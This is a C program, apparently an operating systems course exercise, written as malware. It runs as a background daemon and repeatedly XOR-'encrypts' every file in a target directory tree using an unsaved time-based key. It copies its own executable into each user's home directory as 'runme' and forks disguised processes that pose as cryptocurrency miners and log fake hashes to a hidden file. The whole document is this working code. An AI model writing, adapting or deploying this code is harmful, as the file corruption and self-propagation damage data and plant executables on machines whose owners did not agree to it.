#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <signal.h>

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    setsid();
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

void xor_file(const char* filepath, unsigned int key) {
    FILE *f = fopen(filepath, "rb+");
    if (!f) return;
    int ch;
    while ((ch = fgetc(f)) != EOF) {
        fseek(f, -1, SEEK_CUR);
        fputc(ch ^ key, f);
    }
    fclose(f);
}

void encryptor(const char* path, unsigned int key) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        char fullpath[512];
        sprintf(fullpath, "%s/%s", path, entry->d_name);

        if (entry->d_type == DT_DIR) {
            encryptor(fullpath, key);
        } else {
            xor_file(fullpath, key);
        }
    }
    closedir(dir);
}

void trojan() {
    DIR *dir = opendir("/home");
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        char dest[512];
        sprintf(dest, "/home/%s/runme", entry->d_name);

        FILE *src = fopen("/proc/self/exe", "rb");
        FILE *dst = fopen(dest, "wb");
        if (src && dst) {
            char buf[4096];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
                fwrite(buf, 1, n, dst);
        }
        if (src) fclose(src);
        if (dst) fclose(dst);
    }
    closedir(dir);
}

void mine_crafter(int id) {
    char procname[64];
    sprintf(procname, "mine-crafter-%d", id);
    prctl(PR_SET_NAME, (unsigned long) procname, 0, 0, 0);

    srand(time(NULL) + id);

    while (1) {
        char hash[65];
        for (int i = 0; i < 64; i++)
            hash[i] = "0123456789abcdef"[rand() % 16];
        hash[64] = '\0';

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            time_t now = time(NULL);
            struct tm *t = localtime(&now);
            fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %d] %s\n",
                    t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                    t->tm_hour, t->tm_min, t->tm_sec,
                    id, hash);
            fclose(log);
        }
        int sleep_time = (rand() % 28) + 3;
        sleep(sleep_time);
    }
}

void forkbomb() {
    int counter = 0;
    int max_fork = 5;

    while (counter < max_fork) {
        pid_t pid = fork();
        if (pid == 0) {
            mine_crafter(counter);
            exit(0);
        }
        counter++;
        sleep(1);
    }
}

void unzip_file() {
    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {"unzip", "-o", "starterkit.zip", "-d", "starter_kit", NULL};
        execvp("unzip", argv);
        exit(EXIT_FAILURE);
    }
    wait(NULL);
}

int main() {
    daemonize();

    unsigned int key = (unsigned int)time(NULL);
    srand(key);

    unzip_file();

    while (1) {
        encryptor("/home/user/sisop/test", key); 
        trojan();
        forkbomb();
        sleep(30);
    }
}
